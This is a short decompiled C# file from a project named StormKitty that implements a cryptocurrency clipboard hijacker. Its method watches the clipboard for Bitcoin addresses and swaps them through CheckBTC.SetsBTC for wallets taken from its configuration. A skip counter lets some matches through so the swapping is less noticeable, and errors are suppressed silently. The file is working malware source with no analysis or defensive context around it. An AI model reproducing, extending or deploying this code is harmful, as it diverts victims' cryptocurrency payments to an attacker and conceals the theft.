﻿using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000057 RID: 87
	internal class Bitcoin
	{
		// Token: 0x0600013B RID: 315 RVA: 0x00009860 File Offset: 0x00007A60
		public static void GetBitcoinWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsbtc.Contains(text) && CheckBTC.Clipregex(text))
					{
						if (Bitcoin._oppToMiss > 0)
						{
							Bitcoin._oppToMiss--;
						}
						else
						{
							Bitcoin._oppToMiss = Config.OppToMissDef;
							CheckBTC.SetsBTC(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x040000D8 RID: 216
		public static int _oppToMiss;
	}
}
